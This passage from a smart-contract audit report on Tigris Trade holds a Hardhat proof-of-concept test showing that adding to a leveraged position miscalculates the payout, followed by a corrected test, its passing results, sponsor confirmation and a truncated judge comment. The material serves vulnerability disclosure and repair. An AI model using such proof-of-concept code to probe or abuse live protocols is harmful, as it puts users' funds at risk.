payout $1666&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The price increases from $1000 to $2000, the old position earns $1000 profit.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The expected PnL payout = old margin + earned profit + new margin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $500 + $1000 + $500</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $2000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPrice = parseEther(&#39;2000&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, addingPrice, 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(addingMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).addToPosition(orderId, parseEther(&#39;500&#39;), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let trade = await position.trades(orderId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        trade.margin, trade.leverage, trade.accInterest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.gt(parseEther(&#39;1666&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.lt(parseEther(&#39;1667&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The price decreases from $1000 to $750, the old position losses $250.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The expected PnL payout = old margin - loss + new margin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $500 - $250 + $500</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $750</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPrice = parseEther(&#39;750&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, addingPrice, 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(addingMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).addToPosition(orderId, parseEther(&#39;500&#39;), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let trade = await position.trades(orderId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        trade.margin, trade.leverage, trade.accInterest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.gt(parseEther(&#39;714&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.lt(parseEther(&#39;715&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n<p>The test result</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Incorrect calculation of new margin price while adding position</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Initial margin $500, leverage 2x, position $1000, price $1000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714</span></span></code></pre>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use the correct formula, the following test case is for the same above examples after fix.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">const { expect } = require(&quot;chai&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { deployments, ethers, waffle } = require(&quot;hardhat&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { parseEther, formatEther } = ethers.utils;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { signERC2612Permit } = require(&#39;eth-permit&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const exp = require(&quot;constants&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">describe(&quot;Correct calculation of new margin price while adding position&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let owner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let user;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node3;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let proxy;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let Trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingLibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradinglibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stabletoken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableVault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let position;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let pairscontract;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let referrals;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSig;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSigUsdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockDAI;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let mockdai;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockUSDC;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let mockusdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let badstablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let chainlink;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await deployments.fixture([&#39;test&#39;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableToken = await deployments.get(&quot;StableToken&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stabletoken = await ethers.getContractAt(&quot;StableToken&quot;, StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Trading = await deployments.get(&quot;Trading&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    trading = await ethers.getContractAt(&quot;Trading&quot;, Trading.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await trading.connect(owner).setMaxWinPercent(5e10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingExtension = await deployments.get(&quot;TradingExtension&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradingExtension = await ethers.getContractAt(&quot;TradingExtension&quot;, TradingExtension.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Position = await deployments.get(&quot;Position&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    position = await ethers.getContractAt(&quot;Position&quot;, Position.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockDAI = await deployments.get(&quot;MockDAI&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mockdai = await ethers.getContractAt(&quot;MockERC20&quot;, MockDAI.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockUSDC = await deployments.get(&quot;MockUSDC&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mockusdc = await ethers.getContractAt(&quot;MockERC20&quot;, MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const PairsContract = await deployments.get(&quot;PairsContract&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    pairscontract = await ethers.getContractAt(&quot;PairsContract&quot;, PairsContract.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Referrals = await deployments.get(&quot;Referrals&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    referrals = await ethers.getContractAt(&quot;Referrals&quot;, Referrals.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableVault = await deployments.get(&quot;StableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stablevault = await ethers.getContractAt(&quot;StableVault&quot;, StableVault.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockDAI.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(&quot;1&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node2.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node3.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000000000]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const BadStableVault = await ethers.getContractFactory(&quot;BadStableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    badstablevault = await BadStableVault.deploy(StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const ChainlinkContract = await ethers.getContractFactory(&quot;MockChainlinkFeed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    chainlink = await ChainlinkContract.deploy();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingLibrary = await deployments.get(&quot;TradingLibrary&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradinglibrary = await ethers.getContractAt(&quot;TradingLibrary&quot;, TradingLibrary.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await trading.connect(owner).setLimitOrderPriceRange(1e10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  describe(&quot;Initial margin $500, leverage 2x, position $1000, price $1000&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let orderId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let initPrice = parseEther(&quot;1000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // To simpliy the problem, set fees to 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.setFees(true, 0, 0, 0, 0, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.setFees(false, 0, 0, 0, 0, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let TradeInfo = [parseEther(&quot;500&quot;), MockDAI.address, StableVault.address, parseEther(&quot;2&quot;), 1, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let message = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, initPrice, 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let sig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(message.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      orderId = await position.getCount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await position.assetOpenPositionsLength(1)).to.equal(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let trade = await position.trades(orderId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let marginAfterFee = trade.margin;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(marginAfterFee.eq(parseEther(&#39;500&#39;))).to.equal(true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(trade.price.eq(parseEther(&#39;1000&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(trade.leverage.eq(parseEther(&#39;2&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The price increases from $1000 to $2000, the old position earns $1000 profit.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The expected PnL payout = old margin + earned profit + new margin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $500 + $1000 + $500</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $2000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPrice = parseEther(&#39;2000&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, addingPrice, 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(addingMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).addToPosition(orderId, parseEther(&#39;500&#39;), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let trade = await position.trades(orderId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        trade.margin, trade.leverage, trade.accInterest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.gt(parseEther(&#39;1999.99999&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.lt(parseEther(&#39;2000&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The price decreases from $1000 to $750, the old position losses $250.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // The expected PnL payout = old margin - loss + new margin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $500 - $250 + $500</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      //                         = $750</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPrice = parseEther(&#39;750&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, addingPrice, 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let addingSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(addingMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).addToPosition(orderId, parseEther(&#39;500&#39;), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let trade = await position.trades(orderId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        trade.margin, trade.leverage, trade.accInterest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.gt(parseEther(&#39;749.99999&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(pnl._payout.lt(parseEther(&#39;750&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n<p>The test result</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Correct calculation of new margin price while adding position</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Initial margin $500, leverage 2x, position $1000, price $1000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1375841573\">TriHaz (Tigris Trade) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1384495437\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, 